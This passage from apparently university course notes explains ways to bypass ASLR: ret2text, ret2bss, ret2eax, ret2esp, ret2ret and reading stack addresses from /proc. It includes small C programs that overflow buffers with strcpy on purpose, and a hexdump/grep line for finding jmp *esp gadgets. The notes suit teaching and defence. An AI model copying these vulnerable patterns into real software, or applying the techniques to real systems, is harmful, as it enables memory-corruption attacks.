</pre></div>
</div>
<ol class="arabic" start="3">
<li><p class="first"><strong>Return to non randomized memory</strong></p>
<ol class="loweralpha simple">
<li><code class="docutils literal"><span class="pre">ret2text</span></code> In most cases heap, BSS, data and text segment
are not randomized. Return exploits consist in trying to ping
point to one of those areas. Consider the following program
<code class="docutils literal"><span class="pre">ret2text.c</span></code> Function <code class="docutils literal"><span class="pre">Secret</span></code> code cannot be executed with
current main, except if you’re root. However, its address can be
obtained using <code class="docutils literal"><span class="pre">print</span> <span class="pre">secret</span></code> in GDB. Changing the return
address to secret by exploiting the BO vulnerability of <code class="docutils literal"><span class="pre">strcpy</span></code>
gives access to secret code to non-root user.</li>
</ol>
<blockquote>
<div><div class="highlight-c"><div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">public</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">){</span>
  <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="n">args</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;public</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">secret</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;secret function&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
  <span class="k">if</span><span class="p">(</span><span class="n">getuid</span><span class="p">()</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="n">secret</span><span class="p">();</span>
  <span class="k">else</span> <span class="n">public</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
 <span class="p">}</span>
</pre></div>
</div>
</div></blockquote>
<ol class="loweralpha" start="2">
<li><div class="first line-block">
<div class="line"><code class="docutils literal"><span class="pre">ret2bss</span></code> Programs allow us to perform BO via
<code class="docutils literal"><span class="pre">localBuff</span></code> and store a string in a global variable
<code class="docutils literal"><span class="pre">globalBuff</span></code>.</div>
<div class="line">Even with ASRL, address of <code class="docutils literal"><span class="pre">globalBuff</span></code> does not change. The
exploit consist in:</div>
</div>
<ol class="arabic simple">
<li>extract the address of <code class="docutils literal"><span class="pre">globalBuff</span></code></li>
<li>push a shellcode in <code class="docutils literal"><span class="pre">globalBuff</span></code></li>
<li>and use <code class="docutils literal"><span class="pre">localBuff</span></code> to point to the shellcode</li>
</ol>
</li>
</ol>
<blockquote>
<div><div class="highlight-c"><div class="highlight"><pre><span></span><span class="kt">char</span> <span class="n">globalBuff</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
<span class="kt">void</span> <span class="nf">function</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">){</span>
  <span class="kt">char</span> <span class="n">localBuff</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">localBuff</span><span class="p">,</span><span class="n">input</span><span class="p">);</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">globalBuff</span><span class="p">,</span><span class="n">localBuff</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
  <span class="n">function</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
 <span class="p">}</span>
</pre></div>
</div>
</div></blockquote>
</li>
</ol>
<ol class="arabic" start="3">
<li><p class="first"><strong>Stack jungling</strong> Based on creative ideas from Izik Kotler to bypass
ASLR. Based on exploitation of “a certain stack layout, a certain
program flow, or certain register changes”. In this class, two very
simple examples:</p>
<ol class="loweralpha">
<li><div class="first line-block">
<div class="line"><code class="docutils literal"><span class="pre">RET2EAX</span></code>: Exploitation of EAX (which contains the return
value when a function ends) The program does not seem
vulnerable. <strong>But</strong> <code class="docutils literal"><span class="pre">strcpy</span></code> <strong>returns a pointer to</strong> <code class="docutils literal"><span class="pre">buf</span></code> <strong>which
is stored in EAX</strong>. Guess the address of EAX, you’ll get the
shell code one for free!</div>
</div>
<blockquote>
<div><div class="highlight-c"><div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">function</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">){</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">[]){</span>
  <span class="n">function</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="p">}</span>
</pre></div>
</div>
</div></blockquote>
</li>
<li><div class="first line-block">
<div class="line"><code class="docutils literal"><span class="pre">RET2ESP</span></code>: Exploitation of the <code class="docutils literal"><span class="pre">jmp</span> <span class="pre">*esp</span></code> command. Objective
is to exploit a hardcoded data, here <code class="docutils literal"><span class="pre">jump</span> <span class="pre">*esp</span></code>. If the
address of this instruction is known, you’ve your exploit by
<strong>using it as return address</strong>. Unfortunately, this sequence
does not exist in binary file. Indeed, GCC cannot produce it!
So, what do we do? The problem can be leveraged by observing
that <code class="docutils literal"><span class="pre">jump</span> <span class="pre">*esp</span></code> is equivalent to <code class="docutils literal"><span class="pre">ffe4</span></code> in hexadecimal. The
objective is thus to find this sequence in the binary. This can
be achieve as follows (example):</div>
<div class="line"><code class="docutils literal"><span class="pre">Hexdump</span> <span class="pre">file</span> <span class="pre">|</span> <span class="pre">grep</span> <span class="pre">ffe4</span></code></div>
<div class="line">As usual, the likelyhood to find <code class="docutils literal"><span class="pre">ffe4</span></code> increases with the
size of the file.</div>
</div>
</li>
<li><div class="first line-block">
<div class="line"><code class="docutils literal"><span class="pre">RET2RET</span></code>: Exploit the <code class="docutils literal"><span class="pre">RETCHAIN</span></code> idee. Imagine that the
address to the pointer exists in the stack at a higher address.
The difficulty would be to walk to it, this can be done via
instruction <code class="docutils literal"><span class="pre">ret</span></code>. <code class="docutils literal"><span class="pre">ret</span></code> at the end of a function pops
<code class="docutils literal"><span class="pre">saved</span> <span class="pre">EIP</span></code> and execute it. If <code class="docutils literal"><span class="pre">saved</span> <span class="pre">EIP</span></code> is itselvf a
<code class="docutils literal"><span class="pre">ret</span></code> then the process repeats and elements are removed from
the stacks. And the idea is to walk with multiple <code class="docutils literal"><span class="pre">ret</span></code> until
reaching the pointer address.</div>
<div class="line"><em>Challenge</em>: where to find pointers to newer stack frames (older
pointers have higher address!!)?</div>
<div class="line"><em>Solution</em>: use <code class="docutils literal"><span class="pre">\0</span></code> termination of the buffer to eventually
rewrite an older one into a smaller address.</div>
</div>
</li>
</ol>
</li>
<li><div class="first line-block">
<div class="line"><strong>Stack stethoscope</strong></div>
<div class="line">In linux, <code class="docutils literal"><span class="pre">PID</span></code> of a process can be obtained via
<code class="docutils literal"><span class="pre">pidof</span> <span class="pre">process</span></code>. Command more <code class="docutils literal"><span class="pre">/proc/x/stat</span></code> gives statistics
about process whose <code class="docutils literal"><span class="pre">PID</span></code> is <code class="docutils literal"><span class="pre">x</span></code>. The 28th element of file
<code class="docutils literal"><span class="pre">/proc/x/stat</span></code> is the address of the bottom of the stack.</div>
<div class="line"><em>Exploit</em>: compute the offset between the vulnerable buffer and the
bottom of the stack. This offset does not change, even with ASLR.</div>
</div>
</li>
</ol>
<div class="admonition warning">
<p class="first admonition-title">Warning</p>
<p class="last"><strong>Very important paper for ASLR</strong></p>
</div>
<p class="centered">
<strong><a class="reference external" href="https://pdfs.semanticscholar.org/440e/61ecb744e55d0425cdb648fe24e4ff999686.pdf">https://pdfs.semanticscholar.org/440e/61ecb744e55d0425cdb648fe24e4ff999686.pdf</a></strong></p><table class="docutils footnote" frame="void" id="id3" rules="none">
<colgroup><col class="label" /><col /></colgroup>
<tbody valign="top">
<tr><td class="label"><a class="fn-backref" href="#id1">[4]</a></td><td><a class="reference external" href="https://pdfs.semanticscholar.org/440e/61ecb744e55d0425cdb648fe24e4ff999686.pdf">https://pdfs.semanticscholar.org/440e/61ecb744e55d0425cdb648fe24e4ff999686.pdf</a></td></tr>
</tbody>
</table>
<table class="docutils footnote" frame="void" id="id4" rules="none">
<colgroup><col class="label" /><col /></colgroup>
<tbody valign="top">
<tr><td class="label"><a class="fn-backref" href="#id2">[5]</a></td><td><a class="reference external" href="https://www.exploit-db.com/papers/13232">https://www.exploit-db.com/papers/13232</a></td></tr>
</tbody>
</table>
</div>
</div>


    </div>
      
  </div>
</div>
<footer class="footer">
  <div class="container">
    <p class="pull-right">
      <a id="up" href="#">
        <span class="fa fa-chevron-up"></span>
      </a>
      
        <br/>
        
      
    </p>
    <p>
        &copy; Copyright 2020, Legay Axel, Duchene Fabien, Crochet Christophe, Schmitz Donatien.<br/>
      Created using <a href="http://sphinx-doc.org/">Sphinx</a> 1.6.7.<br/>
    </p>
  </div>
</footer>
  </body>
</html>